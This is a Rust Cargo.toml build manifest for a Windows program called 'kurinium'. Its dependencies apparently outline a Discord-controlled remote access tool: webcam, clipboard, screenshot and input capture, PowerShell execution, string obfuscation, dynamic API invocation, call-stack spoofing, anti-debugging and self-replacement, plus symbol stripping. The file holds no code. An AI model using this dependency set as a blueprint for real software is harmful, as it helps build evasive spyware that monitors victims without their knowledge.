[package]
name = "kurinium"
version = "0.3.5"
edition = "2021"

[target.'cfg(target_os = "windows")'.dependencies]
winapi = { version = "0.3", features = [
    "winbase",
    "wincon",
    "winuser",
    "processthreadsapi",
    "handleapi",
    "winnt",
    "securitybaseapi",
    "winspool",
    "psapi",
    "tlhelp32",
    "fileapi",
    "minwinbase",
] }
windows-volume-control = "0.1"
windows = { version = "0.59", features = [
    "Win32_Foundation",
    "Win32_UI_WindowsAndMessaging",
    "Win32_UI_Input_KeyboardAndMouse",
    "Win32_UI_Shell",
    "Win32_System_Diagnostics_Debug",
    "Win32_System_ProcessStatus",
    "Win32_System_SystemInformation",
    "Win32_System_Threading",
    "Win32_System_Power",
    "Win32_Storage_FileSystem",
    "Win32_System_LibraryLoader",
    "Win32_System_Memory",
    "Win32_NetworkManagement_IpHelper",
    "Win32_Graphics_Gdi",
    "Win32_Devices_DeviceAndDriverInstallation",
    "Win32_System_Registry",
    "Win32_Security",
    "Win32_Media_MediaFoundation",
    "Win32_System_Com",
] }

[dependencies]
serenity = { version = "0.12", default-features = false, features = [
    "client",
    "gateway",
    "rustls_backend",
    "model",
    "cache"
] }
poise = "0.6"

tokio = { version = "1.0", features = ["rt-multi-thread", "macros", "time", "fs", "sync", "signal", "process"] }
once_cell = "1.8"
serde = { version = "1.0", features = ["derive"] }
serde_json = "1.0"
reqwest = { version = "0.12.23", features = ["json", "cookies"] }
# futures = "0.3"  # REMOVED - unused
tracing = "0.1"
# get_if_addrs = "0.5.3"  # REMOVED - unused
tracing-subscriber = { version = "0.3", features = ["env-filter"] }
# async-trait = "0.1"  # REMOVED - unused
anyhow = "1.0"
aes-gcm = "0.10"
argon2 = "0.5"
rand = "0.8.5"
# base64 = "0.22.1"  # REMOVED - unused
obfstr = "0.4"
# hex = "0.4"  # REMOVED - unused
sysinfo = "0.31"
# screenshots = "0.5.0"  # REMOVED - replaced with native Windows GDI
chrono = { version = "0.4", features = ["serde"] }
clipboard-win = "5.4.1"
zip = "0.6.0"
walkdir = "2.3"
gethostname = "0.4.3"
winreg = "0.55.0"
# regex = "1"  # REMOVED - unused
uuid = { version = "1.0", features = ["v4"] }
winres = "0.1"
# hf = "0.3.0"  # REMOVED - unused
nokhwa = { version = "0.10", default-features = false, features = ["input-native"] }
image = { version = "0.25", default-features = false, features = ["jpeg", "png"] }
# lazy_static = "1.5.0"  # REMOVED - unused
dinvk = "0.4.2"
powershell_script = "1.0"
# machine-uid = "0.5.4"  # REMOVED - unused
self-replace = "1.5.0"
rar = "0.4"
unrar = "0.5"
wmi = "0.14"
uwd = "0.3.5"
wraith-rs = { version = "0.1.8", features = ["antidebug", "hooks"] }
# auto-launch = "0.6"  # REMOVED - unused
thiserror = "1.0"
tokio-util = { version = "0.7", features = ["rt"] }
regex = "1.12.2"

[build-dependencies]
winres = "0.1"
anyhow = "1.0"
aes-gcm = "0.10"

# Smaller size profile ----------
[profile.release]
opt-level = "z"
lto = true
codegen-units = 1
strip = "symbols"      # Strip all symbols including PDB info
panic = "unwind"  # Changed from abort for wraith-rs compatibility
overflow-checks = false
debug = 0              # No debug info at all (0 = none)
split-debuginfo = "off"
debug-assertions = false
incremental = false
rpath = false

